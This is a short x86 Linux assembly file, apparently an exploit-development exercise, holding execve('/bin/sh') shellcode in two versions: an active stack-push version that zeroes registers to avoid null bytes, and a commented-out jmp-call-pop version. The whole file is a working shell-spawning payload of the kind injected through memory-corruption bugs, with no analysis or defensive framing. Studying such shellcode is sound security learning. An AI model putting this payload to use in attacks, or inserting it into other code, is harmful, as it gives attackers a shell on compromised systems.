global _start
	_start:
		xor eax,eax
		; hex("/bin/sh") = 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73 0x68
		push eax
		push 68732f2fH
		push 6e69622fH
		mov al,0bH
		mov ebx,esp
		xor ecx,ecx
		xor edx,edx
		int 80H




;global _start
;	_start:
;		jmp getAddress
;	joker:
;		pop ebx
;		xor eax,eax
;		mov al, 0BH
;		xor ecx,ecx
;		xor edx,edx
;		int 80H
;	getAddress:;
;		call joker
;		db "/bin/sh"

